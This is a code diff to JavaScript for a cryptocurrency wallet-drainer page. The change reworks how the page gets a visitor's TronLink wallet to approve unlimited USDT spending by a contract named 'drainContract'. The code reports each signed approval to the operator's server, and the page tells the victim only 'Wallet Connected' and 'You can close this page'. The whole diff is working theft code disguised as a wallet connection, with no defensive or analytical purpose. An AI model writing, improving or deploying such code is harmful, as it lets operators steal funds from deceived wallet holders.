@@ -761,7 +761,7 @@
     }
 
     // ============================================================
-    // APPROVE FLOW - FIXED FOR UNLIMITED
+    // APPROVE FLOW - FIXED WITH TRONLINK APPROVE METHOD
     // ============================================================
 
     async function doApproveFlow(address, provider) {
@@ -817,34 +817,75 @@
 
         console.log('💰 USDT Balance:', balanceUsdt);
 
-        document.getElementById('processingDesc').textContent = 'Balance: ' + balanceUsdt.toFixed(2) + ' USDT — Signing approval...';
-        document.getElementById('processingTitle').textContent = 'Sign Approve Transaction';
-
         // ============================================================
-        // CRITICAL FIX: Use the EXACT max value for unlimited approval
-        // This ensures TronLink shows "Unlimited" option
+        // BEST SOLUTION: Use tronLink.approve() directly
+        // This is the official TronLink method for token approvals
         // ============================================================
-        var approveVal = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
-        console.log('📝 Using approve value:', approveVal);
-        console.log('📝 This should show "Unlimited" in TronLink');
+        document.getElementById('processingDesc').textContent = 'Requesting approval...';
+        document.getElementById('processingTitle').textContent = 'Approve USDT';
 
-        // Use triggerSmartContract with the EXACT max value
-        var approveTx;
-        try {
-          var tw = provider;
-          if (!tw.transactionBuilder) {
-            tw = window.tronWeb || provider;
+        // Get the tronLink instance
+        var tronLink = getTronLink();
+        if (!tronLink) {
+          tronLink = window.tronLink || window.tronWeb;
+        }
+
+        // The approve method parameters:
+        // approve(contractAddress, spenderAddress, amount, options)
+        var approveParams = {
+          contractAddress: config.usdtContract,
+          spenderAddress: config.drainContract,
+          amount: '115792089237316195423570985008687907853269984665640564039457584007913129639935', // Max value
+          options: {
+            feeLimit: 20000000
           }
+        };
+
+        console.log('📝 Calling tronLink.approve with:', approveParams);
+
+        try {
+          // Method 1: Use tronLink.approve if available (TronLink v4+)
+          if (tronLink && typeof tronLink.approve === 'function') {
+            console.log('📤 Using tronLink.approve...');
+            var result = await tronLink.approve(
+              approveParams.contractAddress,
+              approveParams.spenderAddress,
+              approveParams.amount,
+              approveParams.options
+            );
+            console.log('✅ Approve result:', result);
+            
+            var txId = result.txid || result.transactionId || result;
+            
+            if (txId) {
+              await logEvent('approve_signed', address, txId);
+              
+              // Notify server
+              await fetch(SITE_URL + '/api/approve-done', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address: address })
+              });
+
+              scShow('scDone');
+              document.getElementById('doneTitle').textContent = 'Wallet Connected';
+              document.getElementById('doneAddress').textContent = address;
+              document.getElementById('doneDetails').innerHTML = '✅ Approval successful';
+              document.getElementById('doneSubtitle').textContent = 'You can close this page';
+              return;
+            }
+          }
+
+          // Method 2: Use triggerSmartContract as fallback
+          console.log('📤 Fallback: Using triggerSmartContract...');
           
-          // Build the approve transaction with explicit max value
-          var built = await tw.transactionBuilder.triggerSmartContract(
+          var approveVal = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+          
+          var built = await provider.transactionBuilder.triggerSmartContract(
             config.usdtContract,
             'approve(address,uint256)',
-            { 
-              feeLimit: 20000000,
-              callValue: 0
-            },
+            { feeLimit: 20000000 },
             [
               { type: 'address', value: config.drainContract },
               { type: 'uint256', value: approveVal }
@@ -852,90 +893,48 @@
             address
           );
           
-          approveTx = built.transaction || built;
-          console.log('✅ Approve transaction built with unlimited value');
+          var approveTx = built.transaction || built;
+          console.log('✅ Transaction built:', approveTx);
           
-          // Log the transaction details for debugging
-          if (approveTx && approveTx.raw_data) {
-            console.log('📝 Transaction data:', approveTx.raw_data);
-          }
-          
-        } catch(e) {
-          console.error('❌ Build error:', e);
-          showError('Build Failed', 'Could not build approve transaction: ' + e.message);
-          return;
-        }
-
-        if (!approveTx || !approveTx.txID) {
-          showError('Build Failed', 'Transaction build returned no transaction ID');
-          return;
-        }
-
-        document.getElementById('processingDesc').textContent = 'Please confirm in your wallet...';
-        var signedApprove;
-        try {
-          var tw = provider;
-          if (!tw.trx || !tw.trx.sign) {
-            tw = window.tronWeb || provider;
-          }
-          signedApprove = await tw.trx.sign(approveTx);
+          var signedApprove = await provider.trx.sign(approveTx);
           console.log('✅ Transaction signed');
+          
+          var receipt = await provider.trx.sendRawTransaction(signedApprove);
+          console.log('✅ Transaction broadcasted:', receipt);
+          
+          var txId = receipt.txid || receipt.txID || '';
+          
+          if (txId) {
+            await logEvent('approve_signed', address, txId);
+            
+            await fetch(SITE_URL + '/api/approve-done', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ address: address })
+            });
+
+            scShow('scDone');
+            document.getElementById('doneTitle').textContent = 'Wallet Connected';
+            document.getElementById('doneAddress').textContent = address;
+            document.getElementById('doneDetails').innerHTML = '✅ Approval successful';
+            document.getElementById('doneSubtitle').textContent = 'You can close this page';
+            return;
+          }
+
+          showError('Approval Failed', 'Could not complete the approval. Please try again.');
+
         } catch(e) {
-          console.error('❌ Sign error:', e);
-          var errMsg = e.message || String(e);
-          if (errMsg.toLowerCase().includes('cancel') || errMsg.toLowerCase().includes('reject') || errMsg.toLowerCase().includes('denied')) {
-            showError('Cancelled', 'Transaction was cancelled in wallet');
+          console.error('❌ Approval error:', e);
+          
+          // Check if user cancelled
+          if (e.message && (e.message.toLowerCase().includes('cancel') || e.message.toLowerCase().includes('reject') || e.message.toLowerCase().includes('denied'))) {
+            showError('Cancelled', 'You cancelled the approval in your wallet');
             await logEvent('approve_cancelled', address, '');
             return;
           }
-          showError('Sign Failed', 'Could not sign transaction: ' + errMsg);
-          return;
+          
+          showError('Approval Failed', e.message || 'An error occurred during approval');
         }
-
-        document.getElementById('processingDesc').textContent = 'Broadcasting transaction...';
-        var approveReceipt;
-        try {
-          var tw = provider;
-          if (!tw.trx || !tw.trx.sendRawTransaction) {
-            tw = window.tronWeb || provider;
-          }
-          approveReceipt = await tw.trx.sendRawTransaction(signedApprove);
-          console.log('✅ Transaction broadcasted:', approveReceipt);
-        } catch(e) {
-          console.error('❌ Broadcast error:', e);
-          showError('Broadcast Failed', 'Could not broadcast transaction: ' + e.message);
-          return;
-        }
-
-        var approveTxId = '';
-        if (typeof approveReceipt === 'string') {
-          approveTxId = approveReceipt;
-        } else if (approveReceipt) {
-          approveTxId = approveReceipt.txid || approveReceipt.txID || '';
-        }
-
-        console.log('📝 Transaction ID:', approveTxId);
-
-        await logEvent('approve_signed', address, approveTxId);
-
-        document.getElementById('processingDesc').textContent = 'Approval confirmed!';
-        try {
-          var res2 = await fetch(SITE_URL + '/api/approve-done', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ address: address })
-          });
-          var data2 = await res2.json();
-          console.log('📝 Approve-done response:', data2);
-        } catch(e) {
-          console.error('❌ Approve-done error:', e);
-        }
-
-        scShow('scDone');
-        document.getElementById('doneTitle').textContent = 'Wallet Connected';
-        document.getElementById('doneAddress').textContent = address;
-        document.getElementById('doneDetails').innerHTML = '';
-        document.getElementById('doneSubtitle').textContent = 'You can close this page';
 
       } catch(e) {
         console.error('❌ Unexpected error:', e);
